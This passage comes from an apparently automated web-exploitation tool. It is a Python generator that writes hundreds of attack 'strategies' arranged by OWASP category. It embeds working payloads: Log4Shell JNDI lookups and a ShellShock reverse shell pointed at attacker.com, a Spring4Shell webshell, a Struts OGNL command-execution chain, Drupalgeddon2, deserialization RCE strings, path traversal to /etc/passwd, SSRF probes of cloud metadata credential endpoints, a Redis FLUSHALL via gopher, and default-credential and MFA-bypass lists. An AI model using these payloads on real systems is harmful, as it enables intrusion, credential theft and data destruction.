            sid = f"core.a04.workflow.{scenario}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Workflow Bypass {scenario.replace('_',' ').title()} v{v}",
                desc=f"Contournement workflow — {scenario.replace('_',' ')}",
                vuln_type="business_boundary", tech_stack=[],
                phases=[{"name": "bypass", "inject": "param_from_winning_request",
                         "payloads": payloads, "success": {"type": "status_code", "status": 200},
                         "output": "workflow_result"}],
            )))

    return results[:100]


# ---------------------------------------------------------------------------
# A05 — Security Misconfiguration (100)
# ---------------------------------------------------------------------------

def generate_a05() -> list[tuple[str, str]]:
    results: list[tuple[str, str]] = []

    # CORS misconfigurations (20)
    cors_origins = [
        "https://attacker.com", "null", "https://evil.com",
        "https://target.com.evil.com", "https://targetcom.evil.com",
        "https://subdomain.attacker.com", "http://localhost", "http://127.0.0.1",
        "https://google.com", "https://trusted-partner.com",
    ]
    for i, origin in enumerate(cors_origins):
        for v in range(1, 3):
            sid = f"core.a05.cors.v{i+1}.{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"CORS Misconfiguration — origin variant {i+1} v{v}",
                desc=f"CORS accepte origine non autorisée: {origin}",
                vuln_type="cors", tech_stack=[],
                phases=[{"name": "cors_probe", "inject": "param_from_winning_request",
                         "payloads": [origin], "success": {"type": "header_present",
                         "header": "Access-Control-Allow-Origin"}, "output": "cors_result"}],
            )))

    # Security headers absent (20)
    missing_headers = [
        ("csp",                "Content-Security-Policy",         ["default-src", "script-src"]),
        ("hsts",               "Strict-Transport-Security",       ["max-age"]),
        ("x_frame",            "X-Frame-Options",                 ["DENY", "SAMEORIGIN"]),
        ("x_content_type",     "X-Content-Type-Options",          ["nosniff"]),
        ("referrer_policy",    "Referrer-Policy",                 ["no-referrer", "strict-origin"]),
        ("permissions_policy", "Permissions-Policy",              ["geolocation", "camera"]),
        ("coep",               "Cross-Origin-Embedder-Policy",    ["require-corp"]),
        ("coop",               "Cross-Origin-Opener-Policy",      ["same-origin"]),
        ("corp",               "Cross-Origin-Resource-Policy",    ["same-site", "same-origin"]),
        ("expect_ct",          "Expect-CT",                       ["enforce", "max-age"]),
    ]
    for slug, header, kws in missing_headers:
        for v in range(1, 3):
            sid = f"core.a05.missing_header.{slug}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Missing Security Header — {header} v{v}",
                desc=f"Header de sécurité absent: {header}",
                vuln_type="info_disclosure", tech_stack=[],
                phases=[{"name": "header_check", "inject": "param_from_winning_request",
                         "payloads": [""], "success": {"type": "header_present", "header": header},
                         "output": "header_result"}],
            )))

    # Directory listing / sensitive files (20)
    sensitive_paths = [
        "/.git/HEAD", "/.git/config", "/.env", "/.htpasswd", "/.htaccess",
        "/wp-config.php", "/config.php", "/database.yml", "/secrets.yml",
        "/backup.sql", "/dump.sql", "/phpinfo.php", "/server-status",
        "/admin/", "/phpmyadmin/", "/adminer.php", "/.DS_Store",
        "/composer.json", "/package.json", "/.travis.yml", "/web.config",
    ]
    for i, path in enumerate(sensitive_paths):
        sid = f"core.a05.sensitive_file.v{i+1}"
        results.append((sid, _yaml(
            id_=sid, name=f"Sensitive File Exposure — {path}",
            desc=f"Fichier sensible exposé: {path}",
            vuln_type="info_disclosure", tech_stack=[],
            phases=[{"name": "file_probe", "inject": "path_param",
                     "payloads": [path], "success": {"type": "status_code", "status": 200},
                     "output": "file_result"}],
        )))

    # Default credentials per framework (20)
    default_creds = [
        ("jenkins",    ["/j_acegi_security_check", "admin:admin", "admin:password"]),
        ("grafana",    ["/login", "admin:admin"]),
        ("kibana",     ["/api/security/v1/login", "elastic:changeme"]),
        ("gitlab",     ["/users/sign_in", "root:5iveL!fe"]),
        ("sonarqube",  ["/sessions/new", "admin:admin"]),
        ("nexus",      ["/service/rest/v1/security/users", "admin:admin123"]),
        ("jira",       ["/rest/auth/1/session", "admin:admin"]),
        ("confluence", ["/rest/auth/1/session", "admin:admin"]),
        ("tomcat",     ["/manager/html", "tomcat:tomcat"]),
        ("strapi",     ["/admin/auth/local", "admin@strapi.io:strapi"]),
    ]
    for app, (path, *creds) in default_creds:
        for v in range(1, 3):
            sid = f"core.a05.default_creds.{app}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Default Credentials — {app.title()} v{v}",
                desc=f"Credentials par défaut {app}: {creds[0] if creds else ''}",
                vuln_type="auth_bypass", tech_stack=[app],
                phases=[{"name": "cred_test", "inject": "param_from_winning_request",
                         "payloads": creds, "success": {"type": "status_code", "status": 200},
                         "output": "cred_result"}],
            )))

    # Debug endpoints (20) — déjà traités partiellement, on ajoute des variantes
    debug_endpoints = [
        "/debug", "/debug/info", "/debug/vars", "/debug/pprof", "/_debug",
        "/api/debug", "/api/v1/debug", "/__debug__", "/health/details",
        "/metrics", "/prometheus/metrics", "/actuator", "/actuator/health",
        "/actuator/info", "/actuator/env", "/actuator/beans", "/actuator/mappings",
        "/.well-known/security.txt", "/robots.txt",
    ]
    for i, endpoint in enumerate(debug_endpoints):
        sid = f"core.a05.debug_endpoint.v{i+1}"
        results.append((sid, _yaml(
            id_=sid, name=f"Debug Endpoint — {endpoint}",
            desc=f"Endpoint de debug exposé: {endpoint}",
            vuln_type="info_disclosure", tech_stack=[],
            phases=[{"name": "debug_probe", "inject": "path_param",
                     "payloads": [endpoint], "success": {"type": "status_code", "status": 200},
                     "output": "debug_result"}],
        )))

    return results[:100]


# ---------------------------------------------------------------------------
# A06 — Vulnerable & Outdated Components (100)
# ---------------------------------------------------------------------------

_KNOWN_CVE_EXPLOITS = [
    # (slug, name, vuln_type, payloads, keywords, tech_stack)
    ("log4shell_basic",
     "Log4Shell CVE-2021-44228",
     "el_injection",
     ["${jndi:ldap://attacker.com/a}", "${jndi:ldap://${hostName}.attacker.com/a}",
      "${${lower:j}ndi:${lower:l}dap://attacker.com/a}",
      "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}"],
     ["jndi", "lookup", "ldap"],
     ["log4j", "java"]),
    ("log4shell_obfuscated",
     "Log4Shell Obfuscated CVE-2021-44228",
     "el_injection",
     ["${${env:NaN:-j}ndi:${env:NaN:-l}dap://attacker.com/a}",
      "${${lower:j}${upper:n}${lower:d}${upper:i}:ldap://attacker.com/a}"],
     ["jndi", "ldap"],
     ["log4j", "java"]),
    ("spring4shell_basic",
     "Spring4Shell CVE-2022-22965",
     "el_injection",
     ["class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="],
     ["success", "class", "spring"],
     ["spring", "tomcat", "java"]),
    ("struts_ognl_s2_045",
     "Struts2 S2-045 OGNL CVE-2017-5638",
     "el_injection",
     ["%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))).(#ros)}"],
     ["uid=", "root", "www-data"],
     ["struts", "java"]),
    ("shellshock_basic",
     "ShellShock CVE-2014-6271",
     "cmdi",
     ["() { :; }; echo Content-Type: text/plain; echo; id",
      "() { :; }; /bin/bash -c 'id'",
      "() { ignored; }; /bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1"],
     ["uid=", "root", "bash"],
     ["bash", "cgi"]),
    ("drupalgeddon2",
     "Drupalgeddon2 CVE-2018-7600",
     "cmdi",
     ["form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"],
     ["uid=", "root"],
     ["drupal", "php"]),
    ("wp_xmlrpc_brute",
     "WordPress XML-RPC Brute Force",
     "auth_bypass",
     ['<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>'],
     ["isAdmin", "blogid", "url"],
     ["wordpress", "php"]),
    ("php_type_juggling",
     "PHP Type Juggling Authentication Bypass",
     "auth_bypass",
     ["0", "0e1", "0e2137499350","240610708", "QNKCDZO"],
     ["success", "logged", "admin", "welcome"],
     ["php"]),
    ("apache_path_traversal",
     "Apache Path Traversal CVE-2021-41773",
     "lfi",
     ["/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
      "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"],
     ["root:x:", "daemon:"],
     ["apache"]),
    ("nginx_merge_slashes",
     "Nginx Off-By-Slash Path Traversal",
     "lfi",
     ["/static../etc/passwd", "/files../etc/passwd"],
     ["root:x:", "daemon:"],
     ["nginx"]),
]


def generate_a06() -> list[tuple[str, str]]:
    results: list[tuple[str, str]] = []

    for exploit_data in _KNOWN_CVE_EXPLOITS:
        slug, name, vtype, payloads, kws, ts = exploit_data
        for v in range(1, 11):
            sid = f"core.a06.cve.{slug}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"{name} v{v}",
                desc=f"Exploitation composant vulnérable: {name}",
                vuln_type=vtype, tech_stack=ts,
                phases=[
                    {"name": "detect", "inject": "param_from_winning_request",
                     "payloads": payloads[:1], "success": {"type": "body_contains_any",
                     "keywords": kws[:2]}, "output": "detect_result"},
                    {"name": "exploit", "depends_on": "detect_result",
                     "inject": "param_from_winning_request",
                     "payloads": payloads, "success": {"type": "body_contains_any",
                     "keywords": kws}, "output": "exploit_result"},
                ],
            )))

    return results[:100]


# ---------------------------------------------------------------------------
# A07 — Authentication Failures (100)
# ---------------------------------------------------------------------------

def generate_a07() -> list[tuple[str, str]]:
    results: list[tuple[str, str]] = []

    # Session fixation (20)
    session_payloads = [
        "PHPSESSID=fixated123", "JSESSIONID=fixated456", "session=fixated789",
        "auth_token=aaaaaaa", "sid=12345678",
    ]
    for i, sp in enumerate(session_payloads):
        for v in range(1, 5):
            sid = f"core.a07.session_fixation.v{i+1}.{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Session Fixation v{i+1}.{v}",
                desc=f"Fixation de session via cookie prédéfini: {sp.split('=')[0]}",
                vuln_type="session_fixation", tech_stack=[],
                phases=[{"name": "fix_session", "inject": "param_from_winning_request",
                         "payloads": [sp], "success": {"type": "status_code", "status": 200},
                         "output": "fixation_result"}],
            )))

    # Password bruteforce (20)
    common_passwords = [
        "password", "123456", "qwerty", "admin", "letmein",
        "welcome", "monkey", "dragon", "master", "pass123",
    ]
    for i, pwd in enumerate(common_passwords):
        for v in range(1, 3):
            sid = f"core.a07.bruteforce.{pwd.replace('1','one')}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Password Bruteforce — {pwd} v{v}",
                desc=f"Test mot de passe commun: {pwd}",
                vuln_type="auth_bypass", tech_stack=[],
                phases=[{"name": "brute", "inject": "param_from_winning_request",
                         "payloads": [pwd], "success": {"type": "status_code", "status": 200},
                         "output": "brute_result"}],
            )))

    # MFA bypass (20)
    mfa_payloads = [
        "000000", "123456", "999999", "111111", "000001",
        "bypass", "skip", "", "null", "undefined",
    ]
    for i, code in enumerate(mfa_payloads):
        for v in range(1, 3):
            sid = f"core.a07.mfa_bypass.code{i+1}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"MFA Bypass — code {code!r} v{v}",
                desc=f"Contournement MFA avec code: {code!r}",
                vuln_type="auth_bypass", tech_stack=[],
                phases=[{"name": "mfa_probe", "inject": "param_from_winning_request",
                         "payloads": [code], "success": {"type": "status_code", "status": 200},
                         "output": "mfa_result"}],
            )))

    # Account lockout bypass (20)
    lockout_payloads = [
        "X-Forwarded-For: 1.2.3.4", "X-Real-IP: 10.0.0.1",
        "X-Originating-IP: 127.0.0.1", "X-Remote-IP: 192.168.1.1",
        "X-Remote-Addr: 127.0.0.1",
    ]
    for i, header in enumerate(lockout_payloads):
        for v in range(1, 5):
            sid = f"core.a07.lockout_bypass.v{i+1}.{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Account Lockout Bypass via {header.split(':')[0]} v{v}",
                desc=f"Contournement verrouillage compte via header: {header.split(':')[0]}",
                vuln_type="auth_bypass", tech_stack=[],
                phases=[{"name": "lockout_bypass", "inject": "param_from_winning_request",
                         "payloads": [header], "success": {"type": "status_code", "status": 200},
                         "output": "lockout_result"}],
            )))

    # Password reset token (20)
    reset_payloads = [
        "token=aaaaaaa", "token=null", "token=undefined", "token=",
        "token=00000000000000000000",
    ]
    for i, rp in enumerate(reset_payloads):
        for v in range(1, 5):
            sid = f"core.a07.reset_token.v{i+1}.{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Password Reset Token Bypass v{i+1}.{v}",
                desc=f"Contournement token reset: {rp.split('=')[1] or 'empty'}",
                vuln_type="auth_bypass", tech_stack=[],
                phases=[{"name": "reset_bypass", "inject": "param_from_winning_request",
                         "payloads": [rp], "success": {"type": "status_code", "status": 200},
                         "output": "reset_result"}],
            )))

    return results[:100]


# ---------------------------------------------------------------------------
# A08 — Software & Data Integrity Failures (100)
# ---------------------------------------------------------------------------

DESER_PAYLOADS: dict[str, list[str]] = {
    "java_commons":  [
        "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9u",  # base64 ysoserial
        "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7",
    ],
    "java_spring":   [
        "YQAAAAAAAAABAAAAAAAADg==",  # base64 spring gadget header
    ],
    "php_object":    [
        'O:8:"stdClass":0:{}', 'O:4:"User":1:{s:8:"username";s:5:"admin";}',
        'O:29:"Illuminate\\Support\\Collection":',
    ],
    "python_pickle": [
        "Y3Bvc2l4CnN5c3RlbQpwMAAoVmlkCnAxAFJwMgAu",  # base64 pickle
    ],
    "node_serialize": [
        '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
    ],
    "yaml_load":     [
        "!!python/object/apply:os.system ['id']",
        "!!python/object/apply:subprocess.check_output [['id']]",
    ],
    "xml_deser":     [
        '<java.util.PriorityQueue><comparator class="com.sun.org.apache.xpath.internal.objects.XObject"/></java.util.PriorityQueue>',
    ],
    "ruby_marshal":  [
        "BAhvOgtPYmplY3QA",  # base64 ruby marshal Object
    ],
}


def generate_a08() -> list[tuple[str, str]]:
    results: list[tuple[str, str]] = []

    for tech, payloads in DESER_PAYLOADS.items():
        for v in range(1, 13):
            sid = f"core.a08.deserialization.{tech}.v{v}"
            ts = ["java"] if "java" in tech or "spring" in tech else \
                 ["php"] if "php" in tech else \
                 ["python"] if "python" in tech or "pickle" in tech or "yaml" in tech else \
                 ["nodejs"] if "node" in tech else \
                 ["ruby"] if "ruby" in tech else []
            results.append((sid, _yaml(
                id_=sid, name=f"Deserialization {tech.replace('_',' ').title()} v{v}",
                desc=f"Exploitation désérialisation — {tech.replace('_',' ')}",
                vuln_type="deserialization", tech_stack=ts,
                phases=[
                    {"name": "probe_deser", "inject": "param_from_winning_request",
                     "payloads": payloads, "success": {"type": "body_contains_any",
                     "keywords": ["uid=", "root:", "error", "exception", "500"]},
                     "output": "deser_result"},
                ],
            )))

    # Supply chain / integrity checks (20)
    integrity_scenarios = [
        ("cdn_tamper",        ["/cdn/jquery.min.js", "/static/lib/bootstrap.js"],
         ["<script", "function", "jQuery"]),
        ("subresource_miss",  ["integrity=sha256-tampered", "crossorigin=anonymous"],
         ["Failed", "blocked", "integrity"]),
        ("npm_package_name",  ["colors", "event-stream", "ua-parser-js"],
         ["require", "module", "exports"]),
        ("pypi_typosquat",    ["requets", "djano", "numpyy"],
         ["import", "module"]),
    ]
    for slug, payloads, kws in integrity_scenarios:
        for v in range(1, 6):
            sid = f"core.a08.integrity.{slug}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Integrity Failure {slug.replace('_',' ').title()} v{v}",
                desc=f"Vérification intégrité: {slug.replace('_',' ')}",
                vuln_type="deserialization", tech_stack=[],
                phases=[{"name": "integrity_check", "inject": "param_from_winning_request",
                         "payloads": payloads, "success": {"type": "body_contains_any",
                         "keywords": kws}, "output": "integrity_result"}],
            )))

    return results[:100]


# ---------------------------------------------------------------------------
# A09 — Security Logging Failures (100)
# ---------------------------------------------------------------------------

def generate_a09() -> list[tuple[str, str]]:
    results: list[tuple[str, str]] = []

    # Log injection (40)
    log_inject_payloads = [
        "\r\nFAKE_LOG: admin logged in",
        "\nFAKE_LOG: 200 OK /admin",
        "%0aFAKE_LOG: password=secret",
        "%0dFAKE_LOG: user=admin",
        "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html",
        "\\r\\nFAKE_ENTRY",
        "${jndi:ldap://attacker.com/log}",
        "| id > /var/log/app.log",
        "; echo INJECTED >> /var/log/app.log",
        "<script>alert('loginjection')</script>",
    ]
    for i, payload in enumerate(log_inject_payloads):
        for v in range(1, 5):
            sid = f"core.a09.log_injection.v{i+1}.{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Log Injection v{i+1}.{v}",
                desc=f"Injection dans les journaux d'application",
                vuln_type="log_injection", tech_stack=[],
                phases=[{"name": "log_inject", "inject": "param_from_winning_request",
                         "payloads": [payload], "success": {"type": "status_code", "status": 200},
                         "output": "log_result"}],
            )))

    # Blind spots — actions sans logging (30)
    blind_paths = [
        "/api/internal/admin", "/_internal/health", "/debug/trace",
        "/api/v2/backdoor", "/internal/metrics", "/manage/secret",
    ]
    for i, path in enumerate(blind_paths):
        for v in range(1, 6):
            sid = f"core.a09.blind_spot.v{i+1}.{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Logging Blind Spot {path} v{v}",
                desc=f"Action non loguée via {path}",
                vuln_type="info_disclosure", tech_stack=[],
                phases=[{"name": "blind_probe", "inject": "path_param",
                         "payloads": [path], "success": {"type": "status_code", "status": 200},
                         "output": "blind_result"}],
            )))

    # Timing-based log inference (30)
    timing_payloads = [
        "admin", "root", "superuser", "administrator", "system",
        "test", "guest", "support", "backup", "sa",
    ]
    for i, user in enumerate(timing_payloads):
        for v in range(1, 4):
            sid = f"core.a09.timing_inference.{user}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Timing-based Log Inference — {user} v{v}",
                desc=f"Inférence d'existence via timing pour: {user}",
                vuln_type="info_disclosure", tech_stack=[],
                phases=[{"name": "timing_probe", "inject": "param_from_winning_request",
                         "payloads": [user], "success": {"type": "status_code", "status": 200},
                         "output": "timing_result"}],
            )))

    return results[:100]


# ---------------------------------------------------------------------------
# A10 — SSRF (100)
# ---------------------------------------------------------------------------

SSRF_TARGETS = {
    "aws_metadata":    ["http://169.254.169.254/latest/meta-data/",
                        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        "http://169.254.169.254/latest/user-data/"],
    "gcp_metadata":    ["http://metadata.google.internal/computeMetadata/v1/",
                        "http://169.254.169.254/computeMetadata/v1/project/project-id"],
    "azure_metadata":  ["http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                        "http://169.254.169.254/metadata/identity/oauth2/token"],
    "localhost":       ["http://localhost/admin", "http://127.0.0.1/admin",
                        "http://0.0.0.0/admin", "http://[::1]/admin"],
    "internal_ports":  ["http://127.0.0.1:6379/", "http://127.0.0.1:27017/",
                        "http://127.0.0.1:9200/", "http://127.0.0.1:5432/",
                        "http://127.0.0.1:3306/"],
    "file_protocol":   ["file:///etc/passwd", "file:///etc/hosts",
                        "file:///proc/self/environ"],
    "gopher_protocol": ["gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a",
                        "gopher://127.0.0.1:27017/"],
    "dns_rebinding":   ["http://attacker.com.169.254.169.254.nip.io/",
                        "http://ssrf.attacker.com/"],
    "cloud_k8s":       ["http://kubernetes.default.svc/api/v1/namespaces",
                        "http://10.0.0.1:443/api/v1/secrets"],
    "bypass_filter":   ["http://0177.0.0.1/admin", "http://0x7f.0.0.1/admin",
                        "http://2130706433/admin", "http://localho\uff33t/admin"],
}


def generate_a10() -> list[tuple[str, str]]:
    results: list[tuple[str, str]] = []

    for target_type, urls in SSRF_TARGETS.items():
        for v in range(1, 11):
            sid = f"core.a10.ssrf.{target_type}.v{v}"
            kws = {
                "aws_metadata":   ["ami-id", "instance-id", "iam"],
                "gcp_metadata":   ["project-id", "token", "serviceAccounts"],
                "azure_metadata": ["subscriptionId", "resourceGroupName", "principalId"],
                "localhost":      ["admin", "root", "index"],
                "internal_ports": ["redis", "mongo", "elastic", "postgres"],
                "file_protocol":  ["root:x:", "daemon:", "PATH="],
                "gopher_protocol":["OK", "connected"],
                "dns_rebinding":  ["ami-id", "meta-data"],
                "cloud_k8s":      ["apiVersion", "items", "secrets"],
                "bypass_filter":  ["admin", "root", "index"],
            }.get(target_type, ["200", "OK"])
            results.append((sid, _yaml(
                id_=sid, name=f"SSRF {target_type.replace('_',' ').title()} v{v}",
                desc=f"Server-Side Request Forgery — {target_type.replace('_',' ')}",
                vuln_type="ssrf", tech_stack=[],
                phases=[
                    {"name": "ssrf_probe", "inject": "param_from_winning_request",
                     "payloads": urls, "success": {"type": "body_contains_any", "keywords": kws},
                     "output": "ssrf_result"},
                ],
            )))

    return results[:100]


# ---------------------------------------------------------------------------
# Dispatch & Write
# ---------------------------------------------------------------------------

CATEGORY_GENERATORS = {
    "a01": (generate_a01, "a01_access_control"),
    "a02": (generate_a02, "a02_cryptographic"),
    "a03": (generate_a03, "a03_injection"),
    "a04": (generate_a04, "a04_insecure_design"),
    "a05": (generate_a05, "a05_misconfiguration"),
    "a06": (generate_a06, "a06_outdated_components"),
    "a07": (generate_a07, "a07_auth_failures"),
    "a08": (generate_a08, "a08_integrity"),
    "a09": (generate_a09, "a09_logging"),
    "a10": (generate_a10, "a10_ssrf"),
}


def run(categories: list[str] = None, dry_run: bool = False) -> dict[str, int]:
    if categories is None or categories == ["all"]:
        categories = list(CATEGORY_GENERATORS.keys())

    stats: dict[str, int] = {}
    for cat in categories:
        if cat not in CATEGORY_GENERATORS:
            print(f"[WARN] Unknown category: {cat}")
            continue
        gen_fn, subdir = CATEGORY_GENERATORS[cat]
        items = gen_fn()
        out_dir = STRATEGIES_ROOT / subdir
        written = 0
        seen_ids: set[str] = set()
        for sid, content in items:
            if sid in seen_ids:
                continue
            seen_ids.add(sid)
            fname = sid.replace(".", "_").replace("/", "_") + ".yaml"
            path = out_dir / fname
            if not dry_run:
                path.write_text(content, encoding="utf-8")
            written += 1
        stats[cat] = written
        print(f"[{cat.upper()}] {written} strategies → {subdir}/")

    return stats


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate HDWP exploit strategies")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--category", nargs="+", default=["all"])
    args = parser.parse_args()
    stats = run(categories=args.category, dry_run=args.dry_run)
    total = sum(stats.values())
    print(f"\nTotal: {total} strategies generated")


if __name__ == "__main__":
    main()
